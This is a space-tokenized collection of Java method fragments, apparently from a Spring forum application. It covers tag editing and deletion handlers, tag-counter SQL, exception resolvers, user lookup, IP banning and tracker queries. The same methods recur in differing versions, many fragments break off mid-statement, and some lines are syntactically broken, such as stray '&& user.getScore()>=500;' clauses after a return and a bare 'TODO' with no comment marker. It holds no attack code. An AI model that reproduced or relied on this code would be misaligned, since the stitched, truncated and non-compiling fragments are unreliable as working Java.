private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " error.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { String infoMessage = sendEmailToAdmin ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public static DateFormat createShort ( ) { return new SimpleDateFormat ( " dd.MM.yy HH:mm " ) ; } 
public ModelAndView defaultExceptionHandler ( HttpServletRequest request , HttpServletResponse response , Object handler ) { Exception ex = ( Exception ) request . getAttribute ( " javax.servlet.error.exception " ) ; if ( ex = = null ) { return new ModelAndView ( new RedirectView ( " / " ) ) ; } return exceptionResolver . resolveException ( request , response , handler , ex ) ; } 
public ModelAndView handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " errors/user-banned " , " exception " , ex ) ; } 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " errors/common " ) ; prepareModelForCommonException ( modelAndView , request , ex ) ; } modelAndView . addObject ( " exception " , ex ) ; return modelAndView ; } 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { String infoMessage = sendEmailToAdmin ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public @ResponseBody List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { Map < String , Integer > tags = tagService . getTagsByFirstLetter ( term . substring ( 0 , 1 ) , true ) ; return ImmutableList . copyOf ( Iterables . filter ( tags . keySet ( ) , new Predicate < String > ( ) { @Override 
public boolean apply ( String input ) { return input . startsWith ( term ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter , HttpServletRequest request ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; Template tmpl = Template . getTemplate ( request ) ; modelAndView . addObject ( " isModeratorSession " , tmpl . isModeratorSession ( ) ) ; SortedSet < String > firstLetters = tagService . getFirstLetters ( ! tmpl . isModeratorSession ( ) ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByFirstLetter ( firstLetter , ! tmpl . isModeratorSession ( ) ) ; if ( tags . size ( ) = = 0 ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { Map < String , Integer > tags = tagService . getTagsByFirstLetter ( term . substring ( 0 , 1 ) , true ) ; return ImmutableList . copyOf ( Iterables . filter ( tags . keySet ( ) , new Predicate < String > ( ) { @Override 
public ModelAndView changeTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " tagName " ) String oldTagName ) { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { return notFoundPage ; } TagRequest . Change tagRequestChange = new TagRequest . Change ( ) ; tagRequestChange . setOldTagName ( oldTagName ) ; tagRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestChange " , tagRequestChange ) ; return modelAndView ; } 
public ModelAndView changeTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " tagRequestChange " ) TagRequest . Change tagRequestChange , Errors errors ) { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { return notFoundPage ; } tagService . change ( tagRequestChange . getOldTagName ( ) , tagRequestChange . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( tagRequestChange . getTagName ( ) ) ; } ModelAndView modelAndView = new ModelAndView ( " tags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
private ModelAndView redirectToListPage ( String tagName ) { String firstLetter = String . valueOf ( tagName . toLowerCase ( ) . charAt ( 0 ) ) ; String redirectUrl ; try { redirectUrl = " /tags/ " + URLEncoder . encode ( firstLetter , " UTF-8 " ) ; } catch ( UnsupportedEncodingException e ) { redirectUrl = " /tags " ; } ModelAndView modelAndView = new ModelAndView ( new RedirectView ( redirectUrl ) ) ; return modelAndView ; } 
public void createTag ( String tagName ) { jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES(?) " , 
public void changeTag ( Integer tagId , String tagName ) { jdbcTemplate . update ( " UPDATE tags_values set value=? WHERE id=? " , 
public int getTagId ( String tag ) throws TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( QUERY_TAG_ID_BY_NAME + " AND counter>0 " , Integer . class , tag ) ; if ( res . isEmpty ( ) ) { throw new TagNotFoundException ( ) ; 
public int getTagIdByName ( String tagName ) throws TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( QUERY_TAG_ID_BY_NAME , Integer . class , tagName ) ; if ( res . isEmpty ( ) ) { throw new TagNotFoundException ( ) ; 
public int getTagId ( String tag ) throws UserErrorException , TagNotFoundException { checkTag ( tag ) ; return tagDao . getTagId ( tag ) ; } 
private void prepareChangeDataBinder ( ) { TagRequest . Change tagRequestChange = new TagRequest . Change ( ) ; binder = new WebDataBinder ( tagRequestChange ) ; } 
public void changeTest ( ) throws Exception { when ( tagDao . getTagIdByName ( " testTag " ) ) . thenReturn ( 123 ) ; when ( tagDao . getTagIdByName ( " testNewTag " ) ) . thenReturn ( 456 ) ; when ( tagDao . getTagIdByName ( " InvalidTestTag " ) ) . thenThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " #$%@@#%$ " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; when ( tagDao . getTagIdByName ( " testNewTag " ) ) . thenThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void increaseCounterById ( int tagId ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " , 
public void decreaseCounterById ( int tagId ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " , 
public void addTagToTopic ( int msgId , int tagId ) { jdbcTemplate . update ( " INSERT INTO tags VALUES(?,?) " , 
public void deleteTagFromTopic ( int msgId , int tagId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE msgid=? and tagid=? " , 
public synchronized boolean updateTags ( final int msgId , final List < String > tagList ) { final List < String > oldTags = getMessageTags ( msgId ) ; boolean modified = false ; for ( String tag : tagList ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( tag ) ; tagDao . addTagToTopic ( msgId , id ) ; modified = true ; } } for ( String tag : oldTags ) { if ( ! tagList . contains ( tag ) ) { int id = getOrCreateTag ( tag ) ; tagDao . deleteTagFromTopic ( msgId , id ) ; modified = true ; } } return modified ; } 
public synchronized void updateCounters ( final List < String > oldTags , final List < String > newTags ) { for ( String tag : newTags ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( tag ) ; tagDao . increaseCounterById ( id ) ; } } for ( String tag : oldTags ) { if ( ! newTags . contains ( tag ) ) { 
public void create ( String tagName ) { tagDao . createTag ( tagName ) ; } 
public ModelAndView deleteTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " tagName " ) String oldTagName ) { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { return notFoundPage ; } TagRequest . Delete tagRequestDelete = new TagRequest . Delete ( ) ; tagRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestDelete " , tagRequestDelete ) ; return modelAndView ; } 
public ModelAndView deleteTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " tagRequestDelete " ) TagRequest . Delete tagRequestDelete , Errors errors ) { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { return notFoundPage ; } tagService . delete ( tagRequestDelete . getOldTagName ( ) , tagRequestDelete . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( firstLetter ) ; } ModelAndView modelAndView = new ModelAndView ( " tags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
public void deleteTag ( int tagId ) { jdbcTemplate . update ( " DELETE FROM tags_values WHERE id=? " , 
public void increaseCounterById ( int tagId , int tagCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter+? WHERE id=? " , 
public void decreaseCounterById ( int tagId , int tagCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter-? WHERE id=? " , 
public void replaceTagForTopics ( int oldTagId , int newTagId ) { jdbcTemplate . update ( " UPDATE tags SET tagid=? WHERE tagid=? AND msgid NOT IN (SELECT msgid FROM tags WHERE tagid=?) " , 
public void deleteTagFromTopics ( int tagId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE tagid=? " , 
public void updateCounters ( final List < String > oldTags , final List < String > newTags ) { for ( String tag : newTags ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( tag ) ; tagDao . increaseCounterById ( id , 1 ) ; } } for ( String tag : oldTags ) { if ( ! newTags . contains ( tag ) ) { 
public void create ( String tagName ) { tagDao . createTag ( tagName ) ; } 
private void prepareDeleteDataBinder ( ) { TagRequest . Delete tagRequestDelete = new TagRequest . Delete ( ) ; binder = new WebDataBinder ( tagRequestDelete ) ; } 
public void deleteTest ( ) throws Exception { when ( tagDao . getTagIdByName ( " InvalidTestTag " ) ) . thenThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " #$%@@#%$ " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { Map < String , Integer > tags = tagService . getTagsByFirstLetter ( term . substring ( 0 , 1 ) , false ) ; return ImmutableList . copyOf ( Iterables . filter ( tags . keySet ( ) , new Predicate < String > ( ) { @Override 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " errors/common " ) ; prepareModelForCommonException ( modelAndView , request , ex ) ; } modelAndView . addObject ( " exception " , ex ) ; response . setStatus ( HttpServletResponse . SC_INTERNAL_SERVER_ERROR ) ; return modelAndView ; } 
public ModelAndView changeTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " tagName " ) String oldTagName ) throws AccessViolationException { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Change tagRequestChange = new TagRequest . Change ( ) ; tagRequestChange . setOldTagName ( oldTagName ) ; tagRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestChange " , tagRequestChange ) ; return modelAndView ; } 
public ModelAndView changeTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " tagRequestChange " ) TagRequest . Change tagRequestChange , Errors errors ) throws AccessViolationException { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } tagService . change ( tagRequestChange . getOldTagName ( ) , tagRequestChange . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( tagRequestChange . getTagName ( ) ) ; } ModelAndView modelAndView = new ModelAndView ( " tags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
public ModelAndView deleteTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( value = " tagName " ) String oldTagName ) throws AccessViolationException { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Delete tagRequestDelete = new TagRequest . Delete ( ) ; tagRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestDelete " , tagRequestDelete ) ; return modelAndView ; } 
public ModelAndView deleteTagSubmitHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @ModelAttribute ( " tagRequestDelete " ) TagRequest . Delete tagRequestDelete , Errors errors ) throws AccessViolationException { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } tagService . delete ( tagRequestDelete . getOldTagName ( ) , tagRequestDelete . getTagName ( ) , errors ) ; if ( ! errors . hasErrors ( ) ) { return redirectToListPage ( firstLetter ) ; } ModelAndView modelAndView = new ModelAndView ( " tags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; return modelAndView ; } 
public void recalcTagsCounters ( ) { tagDao . recalcAllCounters ( ) ; } 
public void recalcAllCounters ( ) { jdbcTemplate . update ( " update tags_values set counter = (select count(*) from tags join topics on tags.msgid=topics.id where tags.tagid=tags_values.id and not deleted and moderate) " ) ; } 
public void createTag ( String tagName ) { jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES(?) " , tagName ) ; } 
public void changeTag ( Integer tagId , String tagName ) { jdbcTemplate . update ( " UPDATE tags_values set value=? WHERE id=? " , tagName , tagId ) ; 
public void deleteTag ( int tagId ) { jdbcTemplate . update ( " DELETE FROM tags_values WHERE id=? " , tagId ) ; } 
public void increaseCounterById ( int tagId , int tagCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter+? WHERE id=? " , tagCount , tagId ) ; } 
public void decreaseCounterById ( int tagId , int tagCount ) { jdbcTemplate . update ( " UPDATE tags_values SET counter=counter-? WHERE id=? " , tagCount , tagId ) ; } 
public void addTagToTopic ( int msgId , int tagId ) { jdbcTemplate . update ( " INSERT INTO tags VALUES(?,?) " , msgId , tagId ) ; } 
public void deleteTagFromTopic ( int msgId , int tagId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE msgid=? and tagid=? " , msgId , tagId ) ; 
public void deleteTagFromTopics ( int tagId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE tagid=? " , tagId ) ; } 
public String apply ( TrackerFilter input ) { return input . getValue ( ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author ; try { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } int msgid = resultSet . getInt ( " id " ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; int stat1 = resultSet . getInt ( " stat1 " ) ; int groupId = resultSet . getInt ( " gid " ) ; String groupTitle = resultSet . getString ( " gtitle " ) ; String title = resultSet . getString ( " title " ) ; int cid = resultSet . getInt ( " cid " ) ; User lastCommentBy ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } boolean resolved = resultSet . getBoolean ( " resolved " ) ; int section = resultSet . getInt ( " section " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; Timestamp postdate = resultSet . getTimestamp ( " postdate " ) ; boolean uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; int pages = Topic . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
private boolean isGoodTag ( String tag ) { return tagRE . matcher ( tag ) . matches ( ) & & tag . length ( ) > = MIN_TAG_LENGTH & & tag . length ( ) < = MAX_TAG_LENGTH ; } 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return true ; } return user ! = null & & user . isAdministrator ( ) ; && user.getScore()>=500; } 
public void recalcAllCounters ( ) { jdbcTemplate . update ( " update tags_values set counter = (select count(*) from tags join topics on tags.msgid=topics.id where tags.tagid=tags_values.id and not deleted) " ) ; } 
public void moveTopic ( Topic msg , Group newGrp , User moveBy ) { String url = msg . getUrl ( ) ; boolean lorcode = msgbaseDao . getMessageText ( msg . getId ( ) ) . isLorcode ( ) ; jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , newGrp . getId ( ) , msg . getId ( ) ) ; if ( ! newGrp . isLinksAllowed ( ) & & ! newGrp . isImagePostAllowed ( ) ) { jdbcTemplate . update ( " UPDATE topics SET linktext=null, url=null WHERE id=? " , msg . getId ( ) ) ; 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return true ; } return user ! = null & & user . isModerator ( ) ; && user.getScore()>=500; } 
public boolean apply ( String input ) { return input . startsWith ( term ) & & TagService . isGoodTag ( input ) ; } 
public static boolean isGoodTag ( String tag ) { return tagRE . matcher ( tag ) . matches ( ) & & tag . length ( ) > = MIN_TAG_LENGTH & & tag . length ( ) < = MAX_TAG_LENGTH ; } 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return true ; } return user ! = null & & user . getScore ( ) > = 400 ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) Boolean allow_posting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) Boolean captcha_required ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , ts , allow_posting , captcha_required ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , " UTF-8 " ) ) ) ; } 
private static ModelAndView redirectToProfile ( User user ) throws UnsupportedEncodingException { return new ModelAndView ( new RedirectView ( getNoCacheLinkToProfile ( user ) ) ) ; } 
private static String getNoCacheLinkToProfile ( User user ) throws UnsupportedEncodingException { Random random = new Random ( ) ; return " /people/ " + URLEncoder . encode ( user . getNick ( ) , " UTF-8 " ) + " /profile?nocache= " + random . nextInt ( ) ; } 
public View getInfo ( @RequestParam ( " nick " ) String nick ) throws UnsupportedEncodingException { return new RedirectView ( " /people/ " + URLEncoder . encode ( nick , " UTF-8 " ) + " /profile " ) ; } 
public void testUrlEncode ( ) throws Exception { assertEquals ( User . EMPTY_GRAVATAR_SECURE_URL , URLEncoder . encode ( " https:www.linux.org.ru/img/p.gif " , " UTF-8 " ) ) ; assertEquals ( User . EMPTY_GRAVATAR_URL , URLEncoder . encode ( " http:www.linux.org.ru/img/p.gif " , " UTF-8 " ) ) ; } 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return true ; } return user ! = null & & user . getScore ( ) > = 100 ; } 
public boolean canUseTags ( Group group , User user ) { return true ; TODO: inline after 2 april 2012 } 
public User getUser ( String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { throw new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return getUser ( list . get ( 0 ) ) ; } 
public User getUserCached ( int id ) throws UserNotFoundException { return getUserInternal ( id ) ; } 
public User getUser ( int id ) throws UserNotFoundException { return getUserInternal ( id ) ; } 
private User getUserInternal ( int id ) throws UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } 
public void changeScore ( int id , int delta ) { if ( jdbcTemplate . update ( queryChangeScore , delta , id ) = = 0 ) { throw new IllegalArgumentException ( new UserNotFoundException ( id ) ) ; 
public void blockWithoutTransaction ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; 
public void blockWithResetPassword ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; 
public boolean isSessionAuthorized ( ) { return isSessionAuthorized ( session ) & & currentUser ! = null ; } 
private static boolean isSessionAuthorized ( HttpSession session ) { return session ! = null & & session . getAttribute ( " login " ) ! = null & & ( Boolean ) session . getAttribute ( " login " ) ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( ) ) { return false ; } return currentUser . isModerator ( ) ; } 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( ) ) { return false ; } return currentUser . isCorrector ( ) ; } 
private void initCurrentUser ( UserDao userDao , boolean forceUpdate ) { if ( ! isSessionAuthorized ( session ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } try { currentUser = userDao . getUser ( ( String ) session . getAttribute ( " nick " ) ) ; 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int topics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " topics " , topics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } String partFilter ; String partWiki = queryPartWiki ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query ; if ( filter ! = TrackerFilter . ZERO ) { query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; } else { query = String . format ( queryTrackerZeroMain , partIgnored ) ; } return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public void creanEvents ( ) { userEventsDao . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void resetUnreadReplies ( User user ) { jdbcTemplate . update ( UPDATE_RESET_UNREAD_REPLIES , user . getId ( ) ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? " , user . getId ( ) ) ; } 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , UserEventFilterEnum eventFilter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( eventFilter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , UserEventFilterEnum eventFilter ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilter ! = UserEventFilterEnum . ALL ) queryPart = " AND type = ' " + eventFilter . getType ( ) + " ' " ; queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
